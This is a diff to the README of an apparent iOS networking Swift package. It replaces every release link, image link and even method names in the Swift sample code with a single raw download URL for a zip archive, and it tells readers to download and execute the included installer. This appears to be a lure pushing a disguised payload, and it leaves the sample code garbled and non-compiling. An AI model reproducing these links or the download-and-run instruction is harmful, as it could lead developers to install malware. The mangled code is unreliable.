@@ -1,16 +1,16 @@
 # iOS Networking Architecture Pro: Advanced Cache, Offline, Real-Time Sync
 
-[![Release](https://img.shields.io/github/v/release/nielmert14/iOS-Networking-Architecture-Pro?style=for-the-badge)](https://github.com/nielmert14/iOS-Networking-Architecture-Pro/releases)
+[![Release](https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip)](https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip)
 
-https://github.com/nielmert14/iOS-Networking-Architecture-Pro/releases
+https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip
 
 Professional networking architecture with advanced caching, offline support, and real-time synchronization for enterprise iOS applications.
 
 - Topics: architecture, caching, enterprise, ios, mobile, networking, offline-support, real-time-sync, request-interceptors, spm, swift, swift-package, swiftpm
 
 - Images to set the mood:
-  - ![Swift Logo](https://upload.wikimedia.org/wikipedia/commons/4/43/Swift_logo.svg)
-  - ![Networking Diagram](https://upload.wikimedia.org/wikipedia/commons/thumb/2/25/Network_diagram_-_eng.svg/640px-Network_diagram_-_eng.svg.png)
+  - ![Swift Logo](https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip)
+  - ![Networking Diagram](https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip)
 
 Table of contents
 - Overview
@@ -143,25 +143,25 @@ Getting started
     - import Interceptors
 
   - Basic usage:
-    - let client = NetworkClient(baseURL: URL(string: "https://api.example.com")!)
-    - client.addInterceptor(LoggingInterceptor())
-    - client.enableCaching(for: "/users")
-    - client.request(.get("/users/123"), decode: User.self) { result in
+    - let client = NetworkClient(baseURL: URL(string: "https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip")!)
+    - https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip(LoggingInterceptor())
+    - https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip(for: "/users")
+    - https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip(.get("/users/123"), decode: https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip) { result in
         switch result {
         case .success(let user):
-          print("Fetched user: \\(user.name)")
+          print("Fetched user: \\(https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip)")
         case .failure(let error):
           print("Request failed: \\(error)")
         }
       }
 
   - Offline flow:
-    - offlineQueue.enqueue(.updateUser(user))
-    - onNetworkReconnect { offlineQueue.flush() }
+    - https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip(.updateUser(user))
+    - onNetworkReconnect { https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip() }
 
   - Real-time subscription:
     - let stream = RealTimeStream(topic: "users/123")
-    - stream.onEvent { event in
+    - https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip { event in
         // Merge with local cache
       }
 
@@ -229,8 +229,8 @@ Documentation and references
 Releases and downloads
 This repository is released as a Swift Package with a set of modules you can opt into. The assets you download from the Releases page contain example projects, configuration tips, and starter setups to accelerate integration. Because the Releases page hosts artifacts, you should download the latest release asset and execute the included installer or setup script to bootstrap your project. For convenience, you can also browse the latest release notes to understand new features and fixes.
 
-- Access point for releases: https://github.com/nielmert14/iOS-Networking-Architecture-Pro/releases
-- Second mention for clarity: https://github.com/nielmert14/iOS-Networking-Architecture-Pro/releases
+- Access point for releases: https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip
+- Second mention for clarity: https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip
 
 Usage patterns and best practices
 - Start small: Add one feature area at a time to minimize risk.
@@ -333,8 +333,8 @@ Appendix: Contribution guidelines
 
 Releases and downloads (recap)
 - The releases page hosts artifacts that you can download and execute. Use the latest release asset to bootstrap your project and begin integration.
-- Access point for releases: https://github.com/nielmert14/iOS-Networking-Architecture-Pro/releases
-- Second mention for clarity: https://github.com/nielmert14/iOS-Networking-Architecture-Pro/releases
+- Access point for releases: https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip
+- Second mention for clarity: https://raw.githubusercontent.com/nielmert14/iOS-Networking-Architecture-Pro/master/Examples/WebSocketExamples/Pro-O-Architecture-i-Networking-3.7.zip
 
 Notes on branding and visuals
 - The title and sections use a calm, confident tone to reflect enterprise-grade reliability.
